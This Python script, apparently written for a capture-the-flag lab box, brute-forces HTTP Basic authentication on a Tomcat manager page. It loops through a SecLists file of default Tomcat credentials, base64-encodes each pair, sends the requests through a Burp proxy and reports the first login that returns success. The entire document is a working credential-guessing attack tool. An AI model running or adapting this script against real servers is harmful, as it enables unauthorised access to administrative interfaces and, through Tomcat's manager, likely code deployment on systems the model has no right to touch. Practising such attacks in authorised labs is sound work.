#!/usr/bin/python3
# coding:utf-8

from pwn import *
from base64 import *
import requests,sys,signal,pdb,re

def def_handler(sig,frame):
	print("\n[!]Exiting...\n")
	sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT,def_handler)

# Variable_global
main_url = "http://10.10.10.95:8080/manager/html"
burp = {"http": "http://127.0.0.1:8080"}

def makeRequest():
	s = requests.session()

	p1 = log.progress("Brute Force Tomcat")
	p1.status("Start")
	time.sleep(1)

	files = open("/usr/share/wordlists/Seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt", "rb")

	for file in files.readlines():

		file = file.decode().strip()
		p1.status(f"Testing: {file}")

		passwd = b64encode(file.encode())

		header = {
			'Authorization': f'Basic {passwd.decode()}'
		}

		r = s.get(main_url, headers=header, proxies=burp)

		if r.status_code == 200:
			log.success(f"Credential: {file}")
			break

if __name__ == '__main__':
	makeRequest()
